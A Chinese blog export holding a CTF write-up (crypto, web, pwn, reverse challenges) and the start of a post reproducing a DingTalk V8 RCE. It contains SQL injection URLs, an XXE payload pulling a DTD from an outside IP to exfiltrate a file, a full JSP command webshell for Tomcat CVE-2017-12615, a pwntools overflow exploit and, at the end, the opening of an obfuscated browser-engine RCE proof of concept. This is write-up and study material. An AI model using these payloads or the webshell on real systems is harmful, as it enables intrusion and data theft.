<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011647254.png?x-oss-process=hzy" alt="img"></p>
<p>所以flag为flag{GBUfty0vMqlrGOdE}</p>
<h3 id="misc-数据泄露02-泄露的密码">MISC-数据泄露02-泄露的密码</h3>
<p>在网上查找了一些资料然后看到了一篇关于红香蕉APP接口异常问题的博客</p>
<p><a href="https://www.cnblogs.com/tanyiqu66/p/16925174.html">https://www.cnblogs.com/tanyiqu66/p/16925174.html</a></p>
<p>然后看到了一个超级密码</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011647627.png?x-oss-process=hzy" alt="img"></p>
<p>猜想可能是flag，试了一下，发现是正确的</p>
<p>flag{redbanana2022sss}</p>
<h3 id="misc-数据泄露03-泄露的密钥">Misc-数据泄露03-泄露的密钥</h3>
<p>通过数据泄露02得到了一个知乎专栏的链接https://zhuanlan.zhihu.com/p/586641731</p>
<p>然后直接点进了这个作者的专栏，看到了另外一篇红香蕉App文件上传接口分析的博客</p>
<p><a href="https://zhuanlan.zhihu.com/p/588516424">https://zhuanlan.zhihu.com/p/588516424</a></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011647935.png?x-oss-process=hzy" alt="img"></p>
<p>然后在这里找到了key</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011647075.png?x-oss-process=hzy" alt="img"></p>
<p>所以flag{51d0a99c-752e-11ed-b5a7-44af28a75237}</p>
<h3 id="crypto-小菜一碟">CRYPTO-小菜一碟</h3>
<p>基础rsa，给了pqec，可以得出n，然后一把梭就行了</p>
<p>脚本如下</p>
<pre><code class="hljs plaintext">#!/usr/bin/env python3

\# coding:utf-8

\#power by jedi

 

import gmpy2

import binascii

 

p = gmpy2.mpz(159303842369547814925693476555868814571858842104258697105149515713993443203825659998652654127374510196025599003730143012113707484839253123496857732128701609968752699400092431858926716649428960535283324598902169712222454699617671683675932795780343545970625533166831907970102480122242685830820463772025494712199)

q = gmpy2.mpz(172887845783422002789082420254687566789308973977854220003084208506942637236520298084569310184947609392615644191634749946917611949170216103380692838274627779684269566710195695515000492922000964163572308396664983937642827715821977706257150587395323556335081542987902463903436949141288429937432819003811354533477)

e = gmpy2.mpz(19999)

n=p*q

phi_n = (p-1)*(q-1)

d = gmpy2.invert(e, phi_n)

c = gmpy2.mpz(15176702963665501922403999221895690215282504333559191936777611319802899006788248557279808041449600021838150559750953924442905812928090845724972302802437464578850548068341807388913597120410841772162320682183999897958037105171055839318049584110106368746019307718322196559113348222485399508199250407930454163630320204931310511881428526650112302088935473691025195368688328619506405195638348814876023324965555774105055157166629768444387302211760448217666053342945412276047036106026882600555168611384975424201854134312678053294600373283558738680924405596407956073538019064806588050349192904553467435863806385634189342027395)

 

m = pow(c, d, n)

m_hex = hex(m)[2:]

\#print(&quot;ascII:\n%s&quot;%((binascii.b2a_hex(hex(m)[2:])).decode(&#x27;hex&#x27;),))

print(&quot;ascii:\n%s&quot;%(binascii.a2b_hex(m_hex).decode(&quot;utf8&quot;),))</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011647226.png?x-oss-process=hzy" alt="img"></p>
<p>flag{TheFIFAWorldCupQatar2022}</p>
<h3 id="crypto-rrssaa">CRYPTO-RRSSAA</h3>
<p>又是rsa，共模攻击，脚本是网上找的</p>
<p><a href="https://www.cnblogs.com/P201521440001/p/11439344.html">(<em>´∇｀</em>) 欢迎回来！ (cnblogs.com)</a></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011647281.png?x-oss-process=hzy" alt="img"></p>
<pre><code class="hljs plaintext">from libnum import n2s,s2n

from gmpy2 import invert

def egcd(a, b):

  if a == 0:

​    return (b, 0, 1)

  else:

​    g, y, x = egcd(b % a, a)

​    return (g, x - (b // a) * y, y)

 

def main():

  n =12009661749779034756396727735001476479240870865612015038829842902205933793482513947921473324596564360131381673272825627696670005006285512041897441088239864451061162580115681756159571684781053725291373792017708632104655354403858293040327819320525429826177782333368310575073194375936758240831635861902408234679184500210692222813769320679057069396141388699016874655236207995781942641952371703576990739368162064440778948037373761297210161428999949853983436108775543233507952174980558532153931260464690490095906157066427134117380483884033302788872138900564134415075637986008567266705178621552020850567292497574288675960823

  e1= 2333

  c1= 3091063916228464455521357922299851945733179824012337598325935431151534388234889582934719097957211574031506425780821664489121712504278835046257494105641946435467664631146730786295351188439182841680768531937382787335943965667714937822280848763425350089235645289384375623655179569897238696408868150422651859781815376696756981788347283996647604511187607188051598692339333337644956875630361418916795600637518633591481197783209020148212167599700531242494401774503456200889355439781332887736926823527200546226966803759767490748143939212274369822333951327997518975975960530675198444178464821237247544413301735105551687502988

  e2= 23333

  c2= 3020828772115226887000015133333821282592051548686903232559679837758040530392014545308146746971372113818852623844807332306519066119345705458457237902473211958279079988876840270162881686132679217898982958235064386584289972304614458185165683014776410738885399792032602501638437880558924737680288329872135075375340246371405482850885777367009879733890398886462506917356919767329145462495699851367240387357485822078838863882442289942481376842591016730244281710044592948116573144325447524357995553176271890557769659239135878101020400056503293673886968120697821156927485992635172356908737486318910095798432613528160497925715

  s = egcd(e1, e2)

  s1 = s[1]

  s2 = s[2]

  if s1&lt;0:

​    s1 = - s1

​    c1 = invert(c1, n)

  elif s2&lt;0:

​    s2 = - s2

​    c2 = invert(c2, n)

 

  m = pow(c1,s1,n)*pow(c2,s2,n) % n

  print (hex(m))

 

if __name__ == &#x27;__main__&#x27;:

  main()</code></pre>
<p>得到十进制flag，然后转hex之后再转字符串得到flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011647397.png?x-oss-process=hzy" alt="img"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011647579.png?x-oss-process=hzy" alt="img"></p>
<p>flag{m-co-pr1m3}</p>
<h3 id="crypto-simpler">CRYPTO-simpleR</h3>
<p>又又又是个rsa，只给了c，e</p>
<p>用低加密指数分解攻击，爆破得到flag</p>
<p>脚本如下</p>
<pre><code class="hljs plaintext">import gmpy2

import libnum

 

c=3136716033731914452763044128945241240021620048803150767745968848345189851269112855865110275244336447973330360214689062351028386721896599362080560109450218446175674155425523734453425305156053870568600329

 

m = gmpy2.isqrt(c)

m = int(m)

m_text = libnum.n2s(m)  

print(m_text)</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011647585.png?x-oss-process=hzy" alt="img"></p>
<p>flag{efd90a18-7601-11ed-ac93-44af28a75237}</p>
<h3 id="crypto-rand">CRYPTO-rand</h3>
<p>根据已给时间</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011647756.png?x-oss-process=hzy" alt="img"></p>
<p>求此时间的时间戳</p>
<p>然后再异或给的结果</p>
<p>脚本如下：</p>
<pre><code class="hljs plaintext">import random
 import time
 times = time.mktime(time.strptime(&quot;2022-12-10 10:30:50&quot;,&quot;%Y-%m-%d %H:%M:%S&quot;))
 random.seed(times)
 rand = random.randint(0,10**30)
 flag = 881235169941718345882433419366^rand
 print(flag)</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011647956.png?x-oss-process=hzy" alt="img"></p>
<p>flag{659480394773869512498389750739}</p>
<h3 id="web-ezphp">WEB-EzPHP</h3>
<p>首先dirsearch扫目录得到泄露文件</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011647958.png?x-oss-process=hzy" alt="img"></p>
<p>分析源码，可以写文件，但是需要注意strpos函数过滤了下划线，f_name在传参时下划线用点来代替从而绕过过滤</p>
<p>还有就是对于文件内容也进行了一定的限制，过滤了一些函数，同时限制了长度，在网上找了一个相对来说短的马</p>
<p>payload构造如下</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011647967.png?x-oss-process=hzy" alt="img"></p>
<p>上传成功，想要webshell还需要再利用这个写入post马</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011647207.png?x-oss-process=hzy" alt="img"></p>
<p>然后蚁剑连接找flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011647208.png?x-oss-process=hzy" alt="img"></p>
<p>flag{83ccbab8-5dcd-4eb2-b7ed-810148cd2128}</p>
<h3 id="web-ezphp2">WEB-eZphp2</h3>
<p>上一题的进阶，需要把木马写的更短，还是扫一下</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011647227.png?x-oss-process=hzy" alt="img"></p>
<p>访问index.php源码发现提示</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011647389.png?x-oss-process=hzy" alt="img"></p>
<p>继续访问得到源码</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011647688.png?x-oss-process=hzy" alt="img"></p>
<p>跟上一题差不多，就是在长度这里又缩短了</p>
<p>构造payload如下</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011647693.png?x-oss-process=hzy" alt="img"></p>
<p>上传成功，但是system函数或者echo等都无法使用，在这里使用 先dir一下看看flag在哪</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011647698.png?x-oss-process=hzy" alt="img"></p>
<p>file_get_contents函数进行绕过来读flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011647704.png?x-oss-process=hzy" alt="img"></p>
<p>flag{32b9c4c9-9aca-437f-a417-ccdbb096e0f7}</p>
<h3 id="web-sql">WEB-SQL</h3>
<p>Id可以进行查询表内内容</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011647903.png?x-oss-process=hzy" alt="img"></p>
<p>只有俩内容</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011647988.png?x-oss-process=hzy" alt="img"></p>
<p>分析源码有一次urldecode，所以考虑闭合时应该使用二次编码引号,使用联合注入</p>
<p>Payload如下</p>
<p>测试注入列数</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011647573.png?x-oss-process=hzy" alt="img"></p>
<p>注入列数为3</p>
<p>查询数据库</p>
<p><a href="http://59.110.213.14:41373/?id=1%2527union+select+1,2,group_concat(schema_name)+from+information_schema.schemata+%23">http://59.110.213.14:41373/?id=1%2527union+select+1,2,group_concat(schema_name)+from+information_schema.schemata+%23</a></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011647755.png?x-oss-process=hzy" alt="img"></p>
<p>查询名为sqlll的表名</p>
<p><a href="http://59.110.213.14:41373/?id=1%2527union+select+1,2,group_concat(table_name)+from+information_schema.tables+where+table_schema=%2527sqlll%2527+%23">http://59.110.213.14:41373/?id=1%2527union+select+1,2,group_concat(table_name)+from+information_schema.tables+where+table_schema=%2527sqlll%2527+%23</a></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011647764.png?x-oss-process=hzy" alt="img"></p>
<p>查询列名is_this_flag</p>
<p><a href="http://59.110.213.14:41373/?id=1%2527union+select+1,2,group_concat(column_name)+from+information_schema.columns+where+table_name=%2527is_this_flag%2527%23">http://59.110.213.14:41373/?id=1%2527union+select+1,2,group_concat(column_name)+from+information_schema.columns+where+table_name=%2527is_this_flag%2527%23</a></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011647771.png?x-oss-process=hzy" alt="img"></p>
<p>查询flag</p>
<p><a href="http://59.110.213.14:41373/?id=1%2527union+select+1,2,group_concat(flag)+from+sqlll.is_this_flag%23">http://59.110.213.14:41373/?id=1%2527union+select+1,2,group_concat(flag)+from+sqlll.is_this_flag%23</a></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011647901.png?x-oss-process=hzy" alt="img"></p>
<p>得到flag</p>
<p>flag{e4cf1b90-75d1-11ed-9b3b-44af28a75237}</p>
<h3 id="web-有来无回">WEB-有来无回</h3>
<p>访问题目所给文件位置</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011647036.png?x-oss-process=hzy" alt="img"></p>
<p>题目上说了是xxe，所以在服务器上写个dtd恶意文件，直接传上去这个文件的同时监听服务器对应4000端口</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011647344.png?x-oss-process=hzy" alt="img"></p>
<p>构造payload</p>
<pre><code class="hljs plaintext">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;

&lt;!DOCTYPE any[

&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/tmp/flag.txt&quot;&gt;

&lt;!ENTITY % h SYSTEM &quot;http://43.143.195.203:8080/dtd/1.dtd&quot;&gt;

%h;

%dtd;

]&gt;

&lt;user&gt;&amp;xxe;&lt;/user&gt;</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011647425.png?x-oss-process=hzy" alt="img"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011647432.png?x-oss-process=hzy" alt="img"></p>
<p>Base64解码得到flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011647433.png?x-oss-process=hzy" alt="img"></p>
<p>flag{tqxh8rvijg4jibuxuzfaarvq8esu24uz}</p>
<h3 id="web-图书馆">WEB-图书馆</h3>
<p>使用xray进行漏扫得到cve漏洞</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011647456.jpg?x-oss-process=hzy" alt="img"></p>
<p>访问/docs路径得到tomcat版本</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011647466.png?x-oss-process=hzy" alt="img"></p>
<p>找到相关复现文章</p>
<p><a href="https://www.cnblogs.com/confidant/p/15440233.html">Tomcat任意文件写入（CVE-2017-12615）漏洞复现-含POC和EXP - 纸机 - 博客园 (cnblogs.com)</a></p>
<p>PUT直接上传jsp马</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011647655.png?x-oss-process=hzy" alt="img"></p>
<p>&lt;% if(“112”.equals(request.getParameter(“pwd”))){ java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(“i”)).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(“<pre>”); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print(“</pre>”); } %&gt;</p>
<p>密码112，Webshell得到flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011647849.png?x-oss-process=hzy" alt="img"></p>
<p>flag{c97d5af3-5691-43e2-b6a0-ed1dff4f6457}</p>
<h3 id="web-反败为胜">WEB-反败为胜</h3>
<p>进入界面后，发现是一段加密文本，然后通过F12看到了提示，发现是rc4加密，而且密码是0626，所以直接使用rc4在线解密</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011647853.png?x-oss-process=hzy" alt="img"></p>
<p>得到代码如下</p>
<pre><code class="hljs plaintext">&lt;?php

echo(&quot;ser.php: You find me!&quot;);

class ouo&#123;

  private $ser_code = &quot;ser&quot;;

  function __destruct()&#123;

​    if(!empty($this-&gt;ser_code)) &#123;

​      if($this-&gt;ser_code == &quot;FLAG&quot;)

​        echo (&quot;&#123;flag&#125;&quot;);

​      else

​        die(&#x27;Try Again!&#x27;);

​    &#125;&#125;

  function __wakeup()&#123;

​    $this-&gt;ser_code=null;

  &#125;

&#125;

$ser_code = $_COOKIE[&#x27;SER&#x27;];

unserialize($ser_code);

?&gt;</code></pre>
<p>仔细审计代码发现本题反序列化的点在cookie的SER中，所以对SER做了一个反序列化的操作,payload如下</p>
<pre><code class="hljs plaintext">&lt;?php
class ouo&#123;
    private $ser_code = &quot;FLAG&quot;;
    function __destruct()&#123;
        if(!empty($this-&gt;ser_code)) &#123;
            if($this-&gt;ser_code == &quot;FLAG&quot;)
                echo (&quot;&#123;flag&#125;&quot;);
            else
                die(&#x27;Try Again!&#x27;);
        &#125;&#125;
    function __wakeup()&#123;
        $this-&gt;ser_code=null;
    &#125;
&#125;
$h=new ouo();
echo serialize($h);
//O:3:&quot;ouo&quot;:1:&#123;s:13:&quot; ouo ser_code&quot;;s:4:&quot;FLAG&quot;;&#125;</code></pre>
<p>需要绕过wakkup函数，于是得到  O:3:“ouo”:2:{s:13:“ouoser_code”;s:4:“FLAG”;}，但是这里是需要进行url编码的，只有这样cookie那一栏才能识别</p>
<p>所以访问ser.php，并对Cookie传参，得到flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011647858.png?x-oss-process=hzy" alt="img"></p>
<p>flag{30815ff8-76c2-11ed-aec4-44af28a75237}</p>
<h3 id="web-skip">WEB-skip</h3>
<p>这个题目看见页面我就感觉熟悉，之前国外一比赛的原题</p>
<p>[<a href="https://velog.io/@iooi75/CTF-2022-SECCON-CTF-Writeup-skipinxweb">CTF] 2022 SECCON CTF Writeup skipinx(web) (velog.io)</a></p>
<p>curl $(python -c ‘print(&quot;<a href="http://59.110.213.14:54595/?%22+%22proxy=%22+%22q%22*1000+%22&amp;a=b%22*998+%22&amp;c=d%22">http://59.110.213.14:54595/?“+“proxy=”+“q”*1000+”&amp;a=b&quot;*998+“&amp;c=d”</a>)’)</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011647866.png?x-oss-process=hzy" alt="img"></p>
<p>得到flag</p>
<p>flag{abe2ff50ebbc889f8b341fa53fd792e3}</p>
<h3 id="pwn-login">PWN-login</h3>
<p>找到原题：</p>
<p><a href="https://blog.csdn.net/smalosnail/article/details/53694418">https://blog.csdn.net/smalosnail/article/details/53694418</a></p>
<p>大概意思就是：</p>
<p>system地址放在ebp-4，input地址放在放在ebp+0的话，第一步时input地址将会被赋值给esp，ebp指向main函数的栈帧头；执行第二步时，因为esp这个时候指向input了，esp-=4，并赋值给eip，这样eip就获得了input+4中的内容——system地址</p>
<p>但是有个base64</p>
<pre><code class="hljs plaintext">print &quot;ABCD\x84\x92\x04\x08\x40\xeb\x11\x08&quot;.encode(&#x27;base64&#x27;)

QUJDRISSBAhA6xEI</code></pre>
<p>输入QUJDRISSBAhA6xEI就能getshell</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011647090.png?x-oss-process=hzy" alt="img"></p>
<p>flag{wel30me_t0_l0g1n}</p>
<h3 id="pwn-wtf">PWN-Wtf</h3>
<p>给了一个py文件和elf文件</p>
<p>nc靶机之后发现其运行的是py文件然后再打开的elf文件</p>
<p>分析elf文件</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011647391.png?x-oss-process=hzy" alt="img"></p>
<p>输一个v5然后进入fgets函数</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011647600.png?x-oss-process=hzy" alt="img"></p>
<p>每次读入一位，直到v5–！=0，那如果输入-1，就可以无限输入，每次读入都会赋给v4</p>
<p>V4距离rbp0x30，以此劫持程序走向win函数</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011647604.png?x-oss-process=hzy" alt="img"></p>
<p>再根据python文件的流程，脚本如下：</p>
<pre><code class="hljs plaintext">from pwn import *

context(os = &quot;linux&quot;, arch = &quot;amd64&quot;)

context.log_level = &#x27;debug&#x27;

p=remote(&quot;59.110.213.14&quot;,56342)

win=0x4005f4

payload= &#x27;-1&#x27; +&#x27;\n&#x27;*4094+&#x27;a&#x27;*56+p64(win)+&#x27;\n&#x27;  #填满输入缓冲区，使其读入payload

p.recvuntil(&#x27;payload please : &#x27;)

p.sendline(payload.encode(&#x27;hex&#x27;))

p.interactive()</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011647674.png?x-oss-process=hzy" alt="img"></p>
<p>flag{3aed0a1e-7698-11ed-b8bd-44af28a75237}</p>
<h3 id="reverse-tea">Reverse-Tea</h3>
<p>64位无壳丢到ida里面分析</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011647683.png?x-oss-process=hzy" alt="img"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011647767.png?x-oss-process=hzy" alt="img"></p>
<p>这个应该就是xxtea算法</p>
<p>不太熟悉xxtea算法，搜到这个https://www.jianshu.com/p/4272e0805da3</p>
<p>根据文章里的脚本，小改一下</p>
<p>脚本如下：</p>
<pre><code class="hljs plaintext">#include &lt;stdio.h&gt;

\#include &lt;stdint.h&gt;

\#define DELTA 0x9e3779b9

\#define MX (((z&gt;&gt;5^y&lt;&lt;2) + (y&gt;&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))

 

void btea(uint32_t* v, int n, uint32_t const key[4])

&#123;

  uint32_t y, z, sum;

  unsigned p, rounds, e;

  if (n &gt; 1)      /* Coding Part */

  &#123;

​    rounds = 6 + 52 / n;

​    sum = 0;

​    z = v[n - 1];

​    do

​    &#123;

​      sum += DELTA;

​      e = (sum &gt;&gt; 2) &amp; 3;

​      for (p = 0; p &lt; n - 1; p++)

​      &#123;

​        y = v[p + 1];

​        z = v[p] += MX;

​      &#125;

​      y = v[0];

​      z = v[n - 1] += MX;

​    &#125; while (--rounds);

  &#125;

  else if (n &lt; -1)   /* Decoding Part */

  &#123;

​    n = -n;

​    rounds = 6 + 52 / n;

​    sum = rounds * DELTA;

​    y = v[0];

​    do

​    &#123;

​      e = (sum &gt;&gt; 2) &amp; 3;

​      for (p = n - 1; p &gt; 0; p--)

​      &#123;

​        z = v[p - 1];

​        y = v[p] -= MX;

​      &#125;

​      z = v[n - 1];

​      y = v[0] -= MX;

​      sum -= DELTA;

​    &#125; while (--rounds);

  &#125;

&#125;

 

int main()

&#123;

  uint32_t v[9] = &#123; 0x6456DD95,0x2A41FD67,0x0AFE574A5,0x4BFA8D72,0x0E2BF316F,0x166B34BD,0x6232283A,

 0x4A1A8794,0x0D591779B &#125;;

  uint32_t v8[4];

  v8[0] = 0x5571CB4E;

  v8[1] = 0xC38A9D2F;

  v8[2] = 0x1D835B62;

  v8[3] = 0x93C3DC19;

  int n = 9;

  btea(v, -n, v8);

  for (int i = 0; i &lt; 9; i++) &#123;

​    int a = v[i];

​    for (int j = 0; j &lt; 4; j++) &#123;

 

​      int t = a ;

​      printf(&quot;%c&quot;, t);

​      a = a &gt;&gt; 8;

​    &#125;

  &#125;

 

&#125;</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011647857.png?x-oss-process=hzy" alt="img"></p>
<p>flag{3430DF69-C220-40F9-9667-2B8C4A2FE6E9}</p>
]]></content>
      <categories>
        <category>赛后复盘</category>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>赛后复盘</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>钉钉RCE漏洞复现</title>
    <url>/2022/06/14/%E9%92%89%E9%92%89rce/</url>
    <content><![CDATA[<p><strong>钉钉RCE复现</strong></p>
<p>几个月前爆出的钉钉rce漏洞，现在有空了，分析一下原理，复现一下</p>
<p><img src="https://z4a.net/images/2022/06/14/image828bf068f5cde2fe.png" alt="image828bf068f5cde2fe.png"></p>
<span id="more"></span>
<h1 id="影响版本">影响版本</h1>
<pre><code class="hljs plaintext">&lt;=6.3.5</code></pre>
<h1 id="漏洞原理">漏洞原理</h1>
<p>利用了Chromium v8引擎整数溢出漏洞（是V8优化编译器Turbofan在SimplifiedLowering阶段产生的一个整数溢出漏洞），V8是Chromium内核中的JavaScript引擎，负责对JavaScript代码进行解释优化与执行。</p>
<h1 id="漏洞poc">漏洞POC</h1>
<pre><code class="hljs plaintext">&lt;html&gt;

&lt;body&gt;
    &lt;h1&gt; test &lt;/h1&gt;
    &lt;script&gt;
    var _0x1b17=[&#x27;KELCi8OxLg==&#x27;,&#x27;ZE/CpWvCpDkcPA==&#x27;,&#x27;E8Kjw51bQ8O+Klk0w4vCsw==&#x27;,&#x27;w5lnw5Ipwr12RsOCw7B/J8OEw4E=&#x27;,&#x27;QMOtNcO9w77Dv8OIwp3DmQ7CksOdOA==&#x27;,&#x27;X8KgbcK0wqXCuw==&#x27;,&#x27;DjfCg8KK&#x27;,&#x27;OsO3fsOwwojCq0YpMw==&#x27;,&#x27;RMKWBMKHW3PCqcKjTwgMaw==&#x27;,&#x27;O8KCw5PCoMOpwo0=&#x27;,&#x27;e0rDgMO8wqNndsOM&#x27;,&#x27;wphVw6Zhw7wWwrLDg8K1&#x27;,&#x27;IibCvsKFwqXCqMKAw6w4NDgs&#x27;,&#x27;PcO6Z8O2w4LCp20tMWrDhxMZRSLCmSvDuTjCnk8=&#x27;,&#x27;GcOiPsKX&#x27;,&#x27;G8K7w6vDpXNGIcOwLnXDu8K9BkI=&#x27;,&#x27;w7MXFMKhw78WwpYqwqVVFcKR&#x27;,&#x27;GMK/w7vDpnVIJ8Or&#x27;,&#x27;ank7Wy4jw44=&#x27;,&#x27;HTfCicKbGsKEaysJwqTDux1L&#x27;,&#x27;GS3CqsKEwqjCp8KRw5Y=&#x27;,&#x27;GcOmcktVwrw=&#x27;,&#x27;w50aKsKuwq9cdMO4wpTDqyo5GBQ=&#x27;,&#x27;IybCrcKgwrvCpsKGw5w8Pyc5AcOn&#x27;,&#x27;NhbCuwM=&#x27;,&#x27;wqFcbEfDmMOMw6LCkl9ywqwDwocc&#x27;,&#x27;wqfChMOfw4jDjsKzwozCn8Oqwok=&#x27;,&#x27;w4tcwrED&#x27;,&#x27;cCvCsMOQw7g=&#x27;,&#x27;w6pdw4k=&#x27;,&#x27;wqJyw4vCmMO1wrTCj8OSwqnDnSY=&#x27;,&#x27;WsKcBA==&#x27;,&#x27;wrV8w4vCjcOlwrDDgcKXwqTDlQ==&#x27;,&#x27;XsKWD8KeWA==&#x27;,&#x27;H8O+KcKHHGPDiUQ=&#x27;,&#x27;w73Ci8OFw60=&#x27;,&#x27;Wy7Csg==&#x27;,&#x27;e0TDocOvwrR6IsKLQArDsw==&#x27;,&#x27;AzvCjQIS&#x27;,&#x27;VMOxw6/Ciw==&#x27;,&#x27;fEDDp8OdwrhgbMKYGw==&#x27;,&#x27;PCzCvg==&#x27;,&#x27;w5QHwrPDlGRLNQHDpHwqa8OJR3hiwpwyMBJzJR8=&#x27;,&#x27;ZMO8ecOcd8Oow7M6wq1O&#x27;,&#x27;w417wqvDl3BuwooiwrnCpDBZwoNw&#x27;,&#x27;fHtRGA==&#x27;,&#x27;Y24s&#x27;,&#x27;w4VWwrsdKQ8=&#x27;,&#x27;HsKCOC4RwrQ=&#x27;,&#x27;w4AJwrLDi05SLxfDtEI0esODaA==&#x27;,&#x27;L2kiFG0=&#x27;,&#x27;H8O+I8KdBmc=&#x27;,&#x27;w6RcwrEPMQI=&#x27;,&#x27;FTvDq8O+w7Ucax4=&#x27;,&#x27;FsKfJS4Rwrky&#x27;,&#x27;wpBAw5zCjMO1&#x27;,&#x27;HsO+w4PDgsKUWw==&#x27;,&#x27;EcKxwoXDjcOLCQ==&#x27;,&#x27;PkrCncOEOMOww7fCrlDCgMOJesOdAQ==&#x27;,&#x27;F8K+w49bSQ==&#x27;,&#x27;w4dew5rDmMKg&#x27;,&#x27;wp52wrbCpzM=&#x27;,&#x27;wqIjw4xDwqA=&#x27;,&#x27;cMKIw5vCncKdJV/CoMK7RA==&#x27;,&#x27;CiTCnsKdC8KV&#x27;,&#x27;fXtHE8ObSBZqwp5G&#x27;,&#x27;Fjd1EMOqw57CgcOd&#x27;,&#x27;ZsOje8OLbMO8w4Q3wqAQwqU=&#x27;,&#x27;C8Kxw63Dh3RZIcO6Pj4=&#x27;,&#x27;w4rDj8O/&#x27;,&#x27;ZU/Ctg==&#x27;,&#x27;BcKyw55TcsO8HF8+w7jCtsKtEgo7w5LCigQ8&#x27;,&#x27;w4ZdwrkVPAM=&#x27;];(function(_0x4285cf,_0x1b1736)&#123;var _0x1368bb=function(_0x5a17b5)&#123;while(--_0x5a17b5)&#123;_0x4285cf[&#x27;push&#x27;](_0x4285cf[&#x27;shift&#x27;]());&#125;&#125;;_0x1368bb(++_0x1b1736);&#125;(_0x1b17,0x17b));var _0x1368=function(_0x4285cf,_0x1b1736)&#123;_0x4285cf=_0x4285cf-0x0;var _0x1368bb=_0x1b17[_0x4285cf];if(_0x1368[&#x27;kUYGYC&#x27;]===undefined)&#123;(function()&#123;var _0x270725=function()&#123;var _0x2929b1;try&#123;_0x2929b1=Function(&#x27;return\x20(function()\x20&#x27;+&#x27;&#123;&#125;.constructor(\x22return\x20this\x22)(\x20)&#x27;+&#x27;);&#x27;)();&#125;catch(_0x1b9f87)&#123;_0x2929b1=window;&#125;return _0x2929b1;&#125;;var _0x1971fd=_0x270725();var _0x3ad59d=&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&#x27;;_0x1971fd[&#x27;atob&#x27;]||(_0x1971fd[&#x27;atob&#x27;]=function(_0x332690)&#123;var _0x352a1c=String(_0x332690)[&#x27;replace&#x27;](/=+$/,&#x27;&#x27;);var _0x194774=&#x27;&#x27;;for(var 